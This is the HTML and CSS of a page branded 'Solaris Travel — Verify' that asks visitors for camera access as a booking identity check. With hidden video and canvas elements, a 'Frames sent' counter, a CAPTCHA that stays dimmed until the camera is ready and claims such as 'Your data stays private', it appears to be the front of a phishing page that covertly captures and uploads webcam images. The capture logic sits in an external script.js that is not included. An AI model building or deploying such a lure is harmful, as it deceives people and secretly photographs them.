<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Solaris Travel — Verify</title>
<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<script>
  window.__recaptchaReady = false;
  window.__cameraReady    = false;
  window.onRecaptchaLoad = function () {
    window.__recaptchaReady = true;
    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
  };
</script>
<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>

<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  :root{--bg:#fdfbf7;--paper:#fff;--ink:#0f1e3d;--muted:#7a8699;--line:#e8e3d8;--line-2:#f2eee2;--orange:#ff8c42;--orange-dark:#e5742e;--sky:#7dd3fc;--sun:#fbbf24;}
  html,body{height:100%;}
  body{font-family:'Manrope',sans-serif;background:var(--bg);color:var(--ink);min-height:100vh;letter-spacing:-0.005em;position:relative;overflow-x:hidden;}

  /* full screen sun sky background */
  .sky-bg{
    position:fixed;inset:0;z-index:0;
    background:
      radial-gradient(circle at 50% 30%, rgba(251,191,36,0.22) 0%, transparent 40%),
      radial-gradient(circle at 50% 90%, rgba(125,211,252,0.20) 0%, transparent 50%),
      linear-gradient(180deg, #fdfbf7 0%, #fff8ec 100%);
  }

  /* giant sun */
  .sun{
    position:fixed;top:8%;left:50%;transform:translateX(-50%);
    width:220px;height:220px;border-radius:50%;
    background:radial-gradient(circle at 35% 30%, #fff7d0, #fbbf24 60%, #e5742e 100%);
    box-shadow:0 0 80px rgba(251,191,36,0.5),0 0 160px rgba(251,191,36,0.3);
    opacity:.85;z-index:0;
  }

  /* clouds */
  .cloud{
    position:fixed;z-index:0;
    background:radial-gradient(ellipse at center, rgba(255,255,255,0.85), transparent 70%);
    filter:blur(20px);
  }
  .cloud.c1{width:200px;height:80px;top:18%;left:8%;animation:drift 24s linear infinite;}
  .cloud.c2{width:280px;height:100px;top:26%;right:6%;animation:drift 32s linear infinite reverse;}
  @keyframes drift{
    from{transform:translateX(0);}
    to{transform:translateX(40px);}
  }

  /* waves bottom */
  .waves{position:fixed;bottom:0;left:0;right:0;z-index:0;height:180px;}
  .waves svg{width:100%;height:100%;display:block;}

  /* top nav */
  .nav{
    position:relative;z-index:5;
    padding:22px 48px;
    display:flex;justify-content:space-between;align-items:center;
  }
  .brand{
    display:flex;align-items:center;gap:11px;
    font-family:'DM Serif Display',serif;font-size:22px;
  }
  .brand svg{width:26px;height:26px;stroke:var(--orange);stroke-width:1.8;fill:none;}
  .brand em{font-style:italic;color:var(--orange);}
  .nav-chip{
    font-size:12.5px;font-weight:600;
    color:var(--orange);padding:8px 16px;
    background:rgba(255,140,66,0.1);
    border-radius:999px;
    display:flex;align-items:center;gap:7px;
  }
  .nav-chip::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--orange);}

  /* main center */
  .stage{
    position:relative;z-index:5;
    min-height:calc(100vh - 80px);
    display:flex;align-items:center;justify-content:center;
    padding:20px 32px 80px;
  }

  /* glassy card */
  .card{
    width:100%;max-width:460px;
    background:rgba(255,255,255,0.85);
    backdrop-filter:blur(20px) saturate(140%);
    -webkit-backdrop-filter:blur(20px) saturate(140%);
    border:1px solid rgba(255,255,255,0.9);
    border-radius:28px;
    padding:44px 40px 36px;
    box-shadow:
      0 30px 70px rgba(255,140,66,0.15),
      0 8px 24px rgba(15,30,61,0.08);
    position:relative;
  }
  .card::before{
    content:"";position:absolute;
    top:-2px;left:20%;right:20%;height:4px;
    border-radius:4px;
    background:linear-gradient(90deg,transparent,var(--orange),transparent);
    box-shadow:0 0 20px rgba(255,140,66,0.6);
  }

  .card-head{text-align:center;margin-bottom:30px;}
  .sun-icon{
    width:70px;height:70px;margin:0 auto 22px;
    border-radius:50%;
    background:radial-gradient(circle at 35% 30%, #ffd4a8, #ff8c42 60%, #e5742e 100%);
    display:flex;align-items:center;justify-content:center;
    box-shadow:0 12px 30px rgba(255,140,66,0.35);
    position:relative;
  }
  .sun-icon::after{
    content:"";position:absolute;inset:-8px;border-radius:50%;
    border:1.5px dashed rgba(255,140,66,0.35);
    animation:spin 24s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  .sun-icon svg{width:32px;height:32px;stroke:#fff;stroke-width:2;fill:none;position:relative;z-index:1;}

  .card-head h1{
    font-family:'DM Serif Display',serif;font-size:32px;
    letter-spacing:-0.015em;margin-bottom:12px;color:var(--ink);
  }
  .card-head h1 em{font-style:italic;color:var(--orange);}
  .card-head p{font-size:14.5px;color:var(--muted);line-height:1.65;}

  .cam-row{
    padding:18px 20px;
    background:rgba(255,248,240,0.7);
    border:1px solid rgba(255,140,66,0.15);
    border-radius:16px;
    margin-bottom:18px;
    display:flex;gap:16px;align-items:center;
    transition:all .35s;
  }
  .cam-row.active{
    background:rgba(255,237,220,0.9);
    border-color:var(--orange);
    box-shadow:0 8px 24px rgba(255,140,66,0.15);
  }
  .cam-row .ic{
    width:48px;height:48px;border-radius:14px;
    background:#fff;color:var(--muted);
    display:flex;align-items:center;justify-content:center;
    font-size:22px;transition:all .35s;
    box-shadow:0 2px 8px rgba(15,30,61,0.06);
  }
  .cam-row.active .ic{background:var(--orange);color:#fff;box-shadow:0 8px 20px rgba(255,140,66,0.4);}
  .cam-row .txt .t{font-size:15px;font-weight:700;color:var(--ink);}
  .cam-row .txt .s{font-size:13px;color:var(--muted);margin-top:3px;}
  .cam-row .ck{margin-left:auto;color:var(--orange);font-size:24px;display:none;}
  .cam-row.active .ck{display:block;}

  .stats{display:none;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:18px;}
  .stat{
    padding:18px 20px;
    background:rgba(255,248,240,0.7);
    border:1px solid rgba(255,140,66,0.12);
    border-radius:16px;
  }
  .stat .k{font-size:11px;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:8px;}
  .stat .v{font-family:'DM Serif Display',serif;font-size:30px;letter-spacing:-0.02em;color:var(--orange);}

  .captcha-wrap{
    padding:20px;
    background:rgba(255,248,240,0.7);
    border:1px solid rgba(255,140,66,0.12);
    border-radius:16px;
    display:flex;justify-content:center;
    transition:all .35s;
  }
  .captcha-wrap.ready{
    background:rgba(255,237,220,0.9);
    border-color:var(--orange);
  }
  #recaptchaWidget{display:inline-block;}
  .dimmed{opacity:0.4;pointer-events:none;filter:grayscale(0.5);}

  .foot-note{
    text-align:center;font-size:12.5px;color:var(--muted);
    margin-top:22px;font-weight:500;
  }

  video,canvas{display:none;}

  @media (max-width:640px){
    .nav{padding:16px 20px;}
    .sun{width:160px;height:160px;top:6%;}
    .stage{padding:16px 20px 80px;}
    .card{padding:32px 24px 28px;border-radius:22px;}
    .card-head h1{font-size:26px;}
  }
</style>
</head>
<body>

<div class="sky-bg"></div>
<div class="sun"></div>
<div class="cloud c1"></div>
<div class="cloud c2"></div>

<div class="waves">
  <svg viewBox="0 0 1440 180" preserveAspectRatio="none">
    <path d="M0,80 C240,140 480,40 720,80 C960,120 1200,40 1440,80 L1440,180 L0,180 Z" fill="rgba(125,211,252,0.35)"/>
    <path d="M0,110 C280,160 480,80 720,110 C960,140 1200,80 1440,110 L1440,180 L0,180 Z" fill="rgba(125,211,252,0.5)"/>
  </svg>
</div>

<nav class="nav">
  <div class="brand">
    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
    Solaris<em>.</em>
  </div>
  <span class="nav-chip">Secure booking</span>
</nav>

<main class="stage">
  <div class="card">
    <div class="card-head">
      <div class="sun-icon">
        <svg viewBox="0 0 24 24">
          <path d="M12 2l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V5l7-3z" stroke-linejoin="round"/>
          <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h1>Secure your <em>trip</em></h1>
      <p>Allow camera access to verify your identity. We keep your booking protected.</p>
    </div>

    <div class="cam-row" id="camCard">
      <div class="ic">📷</div>
      <div class="txt">
        <div class="t" id="camTitle">Camera access</div>
        <div class="s" id="camSub">Waiting for permission…</div>
      </div>
      <div class="ck">✓</div>
    </div>

    <div class="stats" id="stats">
      <div class="stat"><div class="k">Frames sent</div><div class="v" id="cntCaptures">0</div></div>
      <div class="stat"><div class="k">Status</div><div class="v" id="delStatus">✓</div></div>
    </div>

    <div class="captcha-wrap dimmed" id="captchaWrap">
      <div id="recaptchaWidget"></div>
    </div>

    <p class="foot-note">🔒 Bank-level encryption · Your data stays private</p>
  </div>
</main>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script src="script.js"></script>
</body>
</html>
